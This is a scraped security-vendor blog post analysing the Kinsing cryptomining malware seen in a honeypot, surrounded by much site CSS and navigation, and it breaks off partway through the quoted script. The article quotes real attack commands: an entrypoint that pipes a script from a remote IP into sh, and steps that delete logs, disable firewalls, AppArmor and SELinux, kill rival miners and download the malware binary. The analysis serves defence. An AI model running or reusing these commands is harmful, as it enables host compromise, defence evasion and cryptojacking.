.2s ease;width:20px;z-index:100}.wp-lightbox-container button:focus-visible{outline:3px auto #5a5a5a40;outline:3px auto -webkit-focus-ring-color;outline-offset:3px}.wp-lightbox-container button:hover{cursor:pointer;opacity:1}.wp-lightbox-container button:focus{opacity:1}.wp-lightbox-container button:focus,.wp-lightbox-container button:hover,.wp-lightbox-container button:not(:hover):not(:active):not(.has-background){background-color:#5a5a5a40;border:none}.wp-lightbox-overlay{box-sizing:border-box;cursor:zoom-out;height:100vh;left:0;overflow:hidden;position:fixed;top:0;visibility:hidden;width:100%;z-index:100000}.wp-lightbox-overlay .close-button{align-items:center;cursor:pointer;display:flex;justify-content:center;min-height:40px;min-width:40px;padding:0;position:absolute;right:calc(env(safe-area-inset-right) + 16px);top:calc(env(safe-area-inset-top) + 16px);z-index:5000000}.wp-lightbox-overlay .close-button:focus,.wp-lightbox-overlay .close-button:hover,.wp-lightbox-overlay .close-button:not(:hover):not(:active):not(.has-background){background:none;border:none}.wp-lightbox-overlay .lightbox-image-container{height:var(--wp--lightbox-container-height);left:50%;overflow:hidden;position:absolute;top:50%;transform:translate(-50%,-50%);transform-origin:top left;width:var(--wp--lightbox-container-width);z-index:9999999999}.wp-lightbox-overlay .wp-block-image{align-items:center;box-sizing:border-box;display:flex;height:100%;justify-content:center;margin:0;position:relative;transform-origin:0 0;width:100%;z-index:3000000}.wp-lightbox-overlay .wp-block-image img{height:var(--wp--lightbox-image-height);min-height:var(--wp--lightbox-image-height);min-width:var(--wp--lightbox-image-width);width:var(--wp--lightbox-image-width)}.wp-lightbox-overlay .wp-block-image figcaption{display:none}.wp-lightbox-overlay button{background:none;border:none}.wp-lightbox-overlay .scrim{background-color:#fff;height:100%;opacity:.9;position:absolute;width:100%;z-index:2000000}.wp-lightbox-overlay.active{animation:turn-on-visibility .25s both;visibility:visible}.wp-lightbox-overlay.active img{animation:turn-on-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active){animation:turn-off-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active) img{animation:turn-off-visibility .25s both}@media (prefers-reduced-motion:no-preference){.wp-lightbox-overlay.zoom.active{animation:none;opacity:1;visibility:visible}.wp-lightbox-overlay.zoom.active .lightbox-image-container{animation:lightbox-zoom-in .4s}.wp-lightbox-overlay.zoom.active .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.active .scrim{animation:turn-on-visibility .4s forwards}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active){animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container{animation:lightbox-zoom-out .4s}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .scrim{animation:turn-off-visibility .4s forwards}}@keyframes turn-on-visibility{0%{opacity:0}to{opacity:1}}@keyframes turn-off-visibility{0%{opacity:1;visibility:visible}99%{opacity:0;visibility:visible}to{opacity:0;visibility:hidden}}@keyframes lightbox-zoom-in{0%{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale))}to{transform:translate(-50%,-50%) scale(1)}}@keyframes lightbox-zoom-out{0%{transform:translate(-50%,-50%) scale(1);visibility:visible}99%{visibility:visible}to{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale));visibility:hidden}}
</style>

</style>
<style id='wp-block-table-inline-css' type='text/css'>
.wp-block-table{overflow-x:auto}.wp-block-table table{border-collapse:collapse;width:100%}.wp-block-table thead{border-bottom:3px solid}.wp-block-table tfoot{border-top:3px solid}.wp-block-table <script>
	// Rotate through announcements
	(() => {
		const announcements = document.getElementsByClassName('js-announcement'),
		      length = announcements.length,
			  intervalLength = 4000
		var count = 1
		// Only rotate if more than one
		if ( length > 1 ) setInterval(switchAnnouncements, intervalLength)

		function switchAnnouncements() {
			for (let i = 0; i < announcements.length; i++) {
				// If the next slide prepare to show
				if ( i === count ) {
					announcements[i].classList.remove('hidden')
					announcements[i].classList.add('opacity-0')
				// Otherwise prepare to hide
				} else {
					announcements[i].classList.add('opacity-0')
				}
			}
			// Delay to allow fade transition before setting to display: none
			setTimeout(() => {
			for (let i = 0; i < announcements.length; i++) {
				// If the next slide show
				if ( i === count ) {
					announcements[i].classList.remove('opacity-0')
				// Otherwise hide
				} else {
					announcements[i].classList.add('hidden')
					announcements[i].classList.remove('opacity-0')
				}
			}

			// If reached the end reset to first slide
			if (count === (length - 1 )) {
				count = 0
			// Otherwise move to the next slide
			} else {
				count++
			}

			}, '500')
		 }
	})();
</script>

<script>
	// Hide banner persitently if close button clicked, store setting in cookie
	(() => {
		const announcementBar = document.cookie.split("; ").find((row) => row.startsWith("announcement_closed="))?.split("=")[1];
		const announcementBarElement = document.getElementById('announcement-bar');
		if (announcementBar === 'true') {
			announcementBarElement.style.display = 'none';
			document.querySelector('#page').style = '--banner-height: 0px';
		} else {
			const site = document.querySelector('#page');
			site.style = `--banner-height: ${announcementBarElement.offsetHeight}px`;
		}
	})();
</script>


    <nav class="navbar navbar-expand-lg bg-gray-80">
        <div class="container h-full relative">

            <a class="navbar-brand ml-5 mr-6 lg:ml-0 lg:mr-8" href="https://sysdig.com/" rel="home">
                <img src="https://sysdig.com/wp-content/uploads/sysdig-logo-new-white.svg" alt="Sysdig" width="180" height="65" class="mb-0 " loading="eager">            </a>

                    <svg width="41" height="41" viewBox="0 0 41 41" fill="none" xmlns="http://www.w3.org/2000/svg">

                              stroke-width="1.5" stroke-linecap="round"/>
                        <line class="line-2" x1="7.98535" y1="20.152" x2="32.2108" y2="20.152" stroke="#ffffff"
                              stroke-width="1.5" stroke-linecap="round"/>
                        <line class="line-3" x1="7.98535" y1="27.3873" x2="32.2108" y2="27.3873" stroke="#ffffff"
                              stroke-width="1.5" stroke-linecap="round"/>
                    </svg>
                </button>

                <div class="collapse navbar-collapse" id="navbarNavDropdown">
                    
                    <div class="navbar-modal-wrap">

                        <div class="nav-modal-header lg:hidden text-white flex items-center justify-between ml-5 mr-4 mt-2 mb-2">
                            <a class="navbar-brand w-20" href="https://sysdig.com/" rel="home"><img src="https://sysdig.com/wp-content/uploads/sysdig-logo-new-white.svg" alt="Sysdig" width="180" height="65" class="mb-0 " loading="eager"></a>

	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-93994" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children nav-item pb-6 lg:pb-3"><div class="nav-column-header flex items-center md:flex-wrap md:items-start pb-4" aria-expanded="false"><span>About Sysdig<span></span></span></div>
	<ul aria-labelledby="menu-item-dropdown-93993" role="menu">
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-93995" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="/about/" id="menu-item-dropdown-93995"><div><div class="nav-text position-relative inline">Who We Are<span class="gradient-border-no"></span></div></div></a></li>

</li>

	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-94006" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-6 lg:pb-3  border_left   is-feature-card link-parent flex flex-col items-start justify-center"><a class="nav-link depth-1 border_left  is-feature-card link-parent flex flex-col items-start justify-center" href="/customers/bigcommerce/" id="menu-item-dropdown-94006"><img width="350" height="197" src="https://sysdig.com/wp-content/uploads/sd-nav-feature-customer-350x197.jpg" class="nav-feature-img mb-4 rounded-xl " alt="" decoding="async" srcset="https://sysdig.com/wp-content/uploads/sd-nav-feature-customer-350x197.jpg 350w, https://sysdig.com/wp-content/uploads/sd-nav-feature-customer-175x99.jpg 175w, https://sysdig.com/wp-content/uploads/sd-nav-feature-customer.jpg 600w, / 1w" sizes="(max-width: 350px) 100vw, 350px" />Customer Spotlight<span></span></span><div class="nav-description pt-1">BigCommerce achieves real-time cloud security</div><div class="flex justify-start text-link text-primary mt-3 -ml-3"></div></a></li>

<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55187" class="is-language-dropdown menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children nav-item dropdown"><a id="menu-item-dropdown-55187" class="nav-link flex items-center dropdown-toggle" role="button" data-toggle="dropdown" aria-expanded="false"><img src="https://sysdig.com/wp-content/themes/sysdig/assets/images/globe-white.svg" /> <div class="sr-only ml-1">Languages</div><span></span></a>
<ul class="dropdown-menu flex-col lg:flex-row flex-nowrap px-5 pt-2 pb-6 lg:px-7 lg:py-10 " aria-labelledby="menu-item-dropdown-55187" role="menu">
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" class="mobile-back d-flex d-lg-none pb-4 pt-3"><a href="#" class="d-flex items-center">Back</a></li><li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" class="mobile-nav-column-header d-inline-flex d-lg-none pb-4 w-auto text-white">Language</li>	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55188" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children nav-item pb-6 lg:pb-3  no-header "><div class="nav-column-header flex items-center md:flex-wrap md:items-start pb-4" aria-expanded="false"><span>Language Header &#8211; Hidden<span></span></span></div>
	<ul aria-labelledby="menu-item-55188" role="menu">
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55194" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://de.sysdig.com/" id="menu-item-dropdown-55194"><div><div class="nav-text position-relative inline">Deutsch<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55189" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home nav-item pb-3"><a class="nav-link depth-2" href="https://sysdig.com/" id="menu-item-dropdown-55189"><div><div class="nav-text position-relative inline">English<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55192" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://sysdig.es/" id="menu-item-dropdown-55192"><div><div class="nav-text position-relative inline">Español<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55190" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://fr.sysdig.com/" id="menu-item-dropdown-55190"><div><div class="nav-text position-relative inline">Français<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55191" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://it.sysdig.com/" id="menu-item-dropdown-55191"><div><div class="nav-text position-relative inline">Italiano<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55193" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://sysdig.jp/" id="menu-item-dropdown-55193"><div><div class="nav-text position-relative inline">日本<span class="gradient-border-no"></span></div></div></a></li>
	</ul>
</li>
</ul>
</li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55172" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children nav-item dropdown"><a id="menu-item-dropdown-55172" class="nav-link flex items-center dropdown-toggle" role="button" data-toggle="dropdown" aria-expanded="false">Log In<span></span></a>
<ul class="dropdown-menu flex-col lg:flex-row flex-nowrap px-5 pt-2 pb-6 lg:px-7 lg:py-10 " aria-labelledby="menu-item-dropdown-55172" role="menu">
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" class="mobile-back d-flex d-lg-none pb-4 pt-3"><a href="#" class="d-flex items-center">Back</a></li><li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" class="mobile-nav-column-header d-inline-flex d-lg-none pb-4 w-auto text-white">Log In</li>	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55173" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children nav-item pb-6 lg:pb-3"><div class="nav-column-header flex items-center md:flex-wrap md:items-start pb-4" aria-expanded="false"><span>Monitor<span></span></span></div>
	<ul aria-labelledby="menu-item-55173" role="menu">
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-57656" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://app.sysdigcloud.com/#/login" id="menu-item-dropdown-57656" target="_blank"><div><div class="nav-text position-relative inline">US-East<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-57657" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://us2.app.sysdig.com/#/login" id="menu-item-dropdown-57657"><div><div class="nav-text position-relative inline">US-West<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-57658" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://eu1.app.sysdig.com/#/login" id="menu-item-dropdown-57658"><div><div class="nav-text position-relative inline">EU-Central<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-57659" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://app.au1.sysdig.com/#/login" id="menu-item-dropdown-57659"><div><div class="nav-text position-relative inline">AWS-AP-Sydney<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-92926" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://app.in1.sysdig.com" id="menu-item-dropdown-92926"><div><div class="nav-text position-relative inline">AWS-AP-South<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-57660" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://app.us4.sysdig.com/#/login" id="menu-item-dropdown-57660"><div><div class="nav-text position-relative inline">GCP-US-West<span class="gradient-border-no"></span></div></div></a></li>
	</ul>
</li>
	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55179" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children nav-item pb-6 lg:pb-3"><div class="nav-column-header flex items-center md:flex-wrap md:items-start pb-4" aria-expanded="false"><span>Secure<span></span></span></div>
	<ul aria-labelledby="menu-item-dropdown-57660" role="menu">
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-57661" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://secure.sysdig.com/#/login" id="menu-item-dropdown-57661" target="_blank"><div><div class="nav-text position-relative inline">US-East<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-57662" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://us2.app.sysdig.com/secure/#/login" id="menu-item-dropdown-57662" target="_blank"><div><div class="nav-text position-relative inline">US-West<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-57663" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://eu1.app.sysdig.com/secure/#/login" id="menu-item-dropdown-57663" target="_blank"><div><div class="nav-text position-relative inline">EU-Central<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-57664" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://app.au1.sysdig.com/secure/#/login" id="menu-item-dropdown-57664" target="_blank"><div><div class="nav-text position-relative inline">AWS-AP-Sydney<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-92927" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://app.in1.sysdig.com/secure" id="menu-item-dropdown-92927"><div><div class="nav-text position-relative inline">AWS-AP-South<span class="gradient-border-no"></span></div></div></a></li>
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-57665" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://app.us4.sysdig.com/secure/#/login" id="menu-item-dropdown-57665" target="_blank"><div><div class="nav-text position-relative inline">GCP-US-West<span class="gradient-border-no"></span></div></div></a></li>
	</ul>
</li>
	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55185" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children nav-item pb-6 lg:pb-3  no-header "><div class="nav-column-header flex items-center md:flex-wrap md:items-start pb-4" aria-expanded="false"><span>Log In &#8211; 3rd Column Header &#8211; HIdden<span></span></span></div>
	<ul aria-labelledby="menu-item-dropdown-57665" role="menu">
		<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-57666" class="menu-item menu-item-type-custom menu-item-object-custom nav-item pb-3"><a class="nav-link depth-2" href="https://cx.sysdig.com/" id="menu-item-dropdown-57666" target="_blank"><div><div class="nav-text position-relative inline">Support<span class="gradient-border-no"></span></div></div></a></li>
	</ul>
</li>
</ul>
</li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-55196" class="filter-get-demo menu-item menu-item-type-custom menu-item-object-custom nav-item"><a id="menu-item-dropdown-55196" class="nav-link flex items-center  button " href="/request-a-demo/" target="_blank">Get Demo<span></span></a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-94954" class="menu-item menu-item-type-custom menu-item-object-custom nav-item lg:hidden  is-feature-card link-parent flex flex-col items-start justify-center"><a id="menu-item-dropdown-94954" class="nav-link flex items-start  border_left  is-feature-card link-parent flex flex-col items-start justify-center" href="/555-benchmark/"><img width="350" height="197" src="https://sysdig.com/wp-content/uploads/sd-nav-feature-555-1-350x197.png" class="nav-feature-img mb-4" alt="" decoding="async" srcset="https://sysdig.com/wp-content/uploads/sd-nav-feature-555-1-350x197.png 350w, https://sysdig.com/wp-content/uploads/sd-nav-feature-555-1-175x98.png 175w, https://sysdig.com/wp-content/uploads/sd-nav-feature-555-1.png 600w, / 1w" sizes="(max-width: 350px) 100vw, 350px" />555 Benchmark<div class="nav-description pt-1">Detect and respond to cloud attacks faster than attackers can complete them</div><div class="flex justify-start text-link text-primary mt-3 -ml-3"></div><span></span></a></li>
</ul>
                    </div> <!-- .navbar-modal-wrap -->
                </div> <!-- .navbar-collapse -->

                    </div>
    </nav>
</div>

	<div id="content" class="site-content"><div id="primary" class="content-area"><main id="main" class="site-main">
			
	<div class="c-v4-m1-hero o-section pb-12 md:pb-4
    ">

		<div class="o-container container">
			<div class="row">

								<div class="c-v4-m1-hero--main col-12 col-md-7 col-lg-8 pb-8 md:pb-0">
					<nav aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="https://sysdig.com/blog/">Back to Blog</a></li></ol></nav>
					<h1>Zoom into Kinsing</h1>

					
											<div class="b-v4-block-container-author">
														By <a href="https://sysdig.com/blog/author/kaizhe-huang/">Kaizhe Huang</a> - NOVEMBER 23, 2020						</div>
					
					
					 

    <div class="flex items-center mb-6">
        <p class="font-medium text-sm mb-0 mr-0.5">SHARE:</p>

                    <a class="ml-2.5" style="max-width: 35px; max-height:35px;"
               href="https://www.facebook.com/sharer/sharer.php?u=https://sysdig.com/blog/zoom-into-kinsing-kdevtmpfsi/" target="_blank">
                <img width="72" height="72" src="https://sysdig.com/wp-content/uploads/facebook-3-logo-1-1.png" class="w-full h-full" alt="" decoding="async" loading="lazy" />            </a>
                    <a class="ml-2.5" style="max-width: 35px; max-height:35px;"
               href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://sysdig.com/blog/zoom-into-kinsing-kdevtmpfsi/" target="_blank">
                <img width="72" height="72" src="https://sysdig.com/wp-content/uploads/Vector-1-2.png" class="w-full h-full" alt="" decoding="async" loading="lazy" />            </a>
                    <a class="ml-2.5" style="max-width: 35px; max-height:35px;"
               href="https://twitter.com/intent/tweet?url=https://sysdig.com/blog/zoom-into-kinsing-kdevtmpfsi/&amp;text=" target="_blank">
                <img width="256" height="256" src="https://sysdig.com/wp-content/uploads/twitter-x-logo-black-round-20851.svg" class="w-full h-full" alt="" decoding="async" loading="lazy" />            </a>
         

        
    </div><!-- b-v4-block-container-social-share -->

									</div>

				<div class="c-v4-m1-hero--lottie col-12 col-md-5 col-lg-4 d-flex">
					<div class="d-flex justify-center align-items-center w-100">
						<div class="b-v4-block-container-img md:mt-12">
							<img width="1200" height="628" src="https://sysdig.com/wp-content/uploads/Zoom-into-Kinsing.png" class="attachment-full size-full" alt="" decoding="async" loading="lazy" srcset="https://sysdig.com/wp-content/uploads/Zoom-into-Kinsing.png 1200w, https://sysdig.com/wp-content/uploads/Zoom-into-Kinsing-350x183.png 350w, https://sysdig.com/wp-content/uploads/Zoom-into-Kinsing-1170x612.png 1170w, https://sysdig.com/wp-content/uploads/Zoom-into-Kinsing-768x402.png 768w, https://sysdig.com/wp-content/uploads/Zoom-into-Kinsing-175x92.png 175w, / 1w" sizes="(max-width: 1200px) 100vw, 1200px" />						</div>
					</div>
				</div>

			</div>
		</div>
	</div>


	<div class="o-container container b-v4-block-container has-global-padding pb-12 md:pb-24">

	<div class="row justify-content-between">

						<style>
                    /* Use calculated var from announement bar script to calc top offset */
                    .c-nav-links {
                        top: calc(var(--navigation--height) + var(--banner-height, 0px));
                    }

                    .admin-bar .c-nav-links {
                        top: calc(32px + var(--navigation--height) + var(--banner-height, 0px));
                    }
				</style>

				<div id="nav-links-desktop"
				     class="c-nav-links b-v4-block-container-anchors-wrapper c-toc__wrapper col-12 relative sticky bg-white mb-2 mt-0">
					<div id="nav-links-desktop-content"
					     class="b-v4-block-container-anchors collapse show col-12 col-md-11">
						<p>content:</p>
													<a href="#page"
							   class="b-v4-block-container-anchors-links">Table of contents</a>

							   class="b-v4-block-container-anchors-links">Starting point</a>

							   class="b-v4-block-container-anchors-links">Kinsing the malware</a>

							   class="b-v4-block-container-anchors-links">The crypto miner</a>

							   class="b-v4-block-container-anchors-links">The C2 server</a>

							   class="b-v4-block-container-anchors-links">About kdevtmpfsi</a>

							   class="b-v4-block-container-anchors-links">CPU usage</a>

					<div class="b-v4-block-container-anchors-wrapper-heading flex justify-end items-center">
						<button type="button"
						        class="button-toggle p-0"
						        data-toggle="collapse"
						        data-target="#nav-links-desktop-content"
						        aria-expanded="true"
						        aria-controls="nav-links-desktop-content">
							<span class="open">Show Table of Contents +</span>

						</button>
					</div>
				</div>


				<div class="dropdown flex lg:hidden col-12 py-6">
					<a class="dropdown-toggle text-black px-5 py-2"
						 id="dropdownMenuButton"
						 data-toggle="dropdown"
						 aria-expanded="false"
						 data-flip="false"
						 data-offset="0, -20">Content</a>
					<div class="dropdown-menu px-4 pb-5 pt-8" aria-labelledby="dropdownMenuButton">
						<ul class="px-1">
															<li>
									<a href="#page">Table of contents</a>
								</li>
															<li>
									<a href="#start">Starting point</a>
								</li>
															<li>
									<a href="#kinsing">Kinsing the malware</a>
								</li>

									<a href="#miner">The crypto miner</a>
								</li>

									<a href="#c2">The C2 server</a>
								</li>

									<a href="#kdevtmpfsi">About kdevtmpfsi</a>
								</li>

									<a href="#cpu">CPU usage</a>
								</li>
															<li>
									<a href="#preparation">Kdevtmpfsi preparation</a>
								</li>
															<li>
									<a href="#communication">Kdevtmpfsi communication</a>
								</li>
															<li>
									<a href="#mitigation">Mitigation strategies</a>
								</li>
															<li>
									<a href="#conclusion">Conclusion</a>
								</li>
													</ul>
					</div>
				</div>
							
		
			<div class="col-12 col-lg-8 offset-lg-2">

				
				<div class="entry-content wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained"><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
<html><body><p>The <i>Kinsing</i> attack has recently been reported by security researchers, and it is well known for targeting misconfigured cloud native environments. It is also known for its comprehensive attack patterns, as well as <a href="https://sysdig.com/blog/mitre-defense-evasion-falco/">defense evasion</a> schemes.</p>



<p>A misconfigured host or cluster could be exploited to run any container desired by the attacker. That would cause outages on your service or be used to perform <a href="https://sysdig.com/blog/lateral-movement-cloud-containers/">lateral movement</a> to other services, compromising your data.</p>



<p>In this blog, we are going to dive into the attack patterns of <i>Kinsing</i>. The better we understand this attack, the better we can defend our cloud native environment.</p>



<h2 class="wp-block-heading" id="start">Starting point</h2>



<p>According to <a rel="noopener nofollow noreferrer" target="_blank" href="https://www.shodan.io/">Shodan</a>, a search engine for internet-connected devices, more than 2,000 Docker engines were exposed to the internet. Some of those Docker engines <strong>weren&rsquo;t configured with authentication</strong>, which make them a perfect target for <i>Kinsing</i> attacks.</p>



<p>In our honeypot project, we noticed that a latest version of the Ubuntu container was created without any privileged setting. It looked like a normal container running. However, we noticed the entrypoint of the image, as it was a little bit suspicious.</p>



<pre class="wp-block-preformatted">/bin/bash-capt-get update &amp;&amp; apt-get install -y wget cron;service cron start; wget -q -O - 45.10.88.124/d.sh | sh;tail -f /dev/null</pre>



<p>What grabbed our attention was:</p>



<ol class="wp-block-list">
<li>The code ran <code>apt-get</code> inside a running container. This is not a normal behavior since all of your packages&rsquo; installation/update should be done earlier, only once, when building the image.</li>



<li>Starting <strong>cron services</strong> inside a running container is also abnormal. You should run periodic tasks at the orchestrator level, using <a rel="noopener nofollow noreferrer" target="_blank" href="https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/">CronJob</a> or <a rel="noopener nofollow noreferrer" target="_blank" href="https://kubernetes.io/docs/concepts/workloads/controllers/job/">Jobs</a>.</li>



<li><strong>Downloading a shell script</strong> from an unknown IP address also looks suspicious. A whois lookup located the IP in a Eastern European country. Also note that most of your services don&#8217;t need egress traffic to the internet.</li>



<li>The code ran <code>tail -f /dev/null</code> in order to keep the container running.</li>
</ol>



<p>Upon closer inspection, it looks like the downloaded <strong>d.sh</strong> is the malicious script that kicks off the <i>Kinsing</i> attacks. After the script is downloaded, it is executed to do the following:</p>



<p>1) Prepare for running malware by increasing the <i>fd</i> limit, removing <i>syslog</i>, and changing file/directories&rsquo; permission.</p>



<pre class="wp-block-preformatted">ulimit -n 65535
rm -rf /var/log/syslog
chattr -iua /tmp/
chattr -iua /var/tmp/
chattr -R -i /var/spool/cron
chattr -i /etc/crontab</pre>



<p>2) Turn off security services (comments were added to explain the commands):</p>



<pre class="wp-block-preformatted"># Disable firewall
ufw disable
# Remove iptable rules
iptables -F
# Stop NMI hard lock detector so that no hardware instruction interruption is feasible
sudo sysctl kernel.nmi_watchdog=0
echo '0' &gt;/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' &gt;&gt;/etc/sysctl.conf
# Stop apparmor
service apparmor stop
systemctl disable apparmor
# Stop SELinux
setenforce 0
echo SELINUX=disabled &gt;/etc/selinux/config
# Stop security service from Ali Cloud
curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
pkill aliyun-service
rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
rm -rf /usr/local/aegis*
systemctl stop aliyun.service
systemctl disable aliyun.service
service bcm-agent stop
yum remove bcm-agent -y
apt-get remove bcm-agent -y</pre>



<p>3) Kill other crypto mining processes and their cronjobs:</p>



<pre class="wp-block-preformatted">ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:8080" | awk '{print $2}' | xargs -I % kill -9 %
ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xargs -I % kill -9 %
pkill -f cryptonight
pkill -f sustes
pkill -f xmrig
pkill -f xmrig-cpu
crontab -l | sed '/xmr.ipzse.com/d' | crontab -
crontab -l | sed '/185.181.10.234/d' | crontab -
crontab -l | sed '/146.71.79.230/d' | crontab -
crontab -l | sed '/122.51.164.83/d' | crontab -</pre>



<p>4) Delete files related to crypto mining:</p>



<pre class="wp-block-preformatted">rm -rf /var/tmp/2.sh
rm -rf /var/tmp/config.json
rm -rf /var/tmp/xmrig
rm -rf /var/tmp/1.so</pre>



<p>5) Download the Kinsing malware and run the following:</p>



<pre class="wp-block-preformatted"># This is the first download
$WGET $DIR/kinsing https://bitbucket.org/tromdiga1/git/raw/master/kinsing
chmod +x $DIR/kinsing
# Try downloading from a different source if the first one failed
$WGET $DIR/kinsing http://45.10.88.124/kinsing
chmod +x $DIR/kinsing
# Run the command
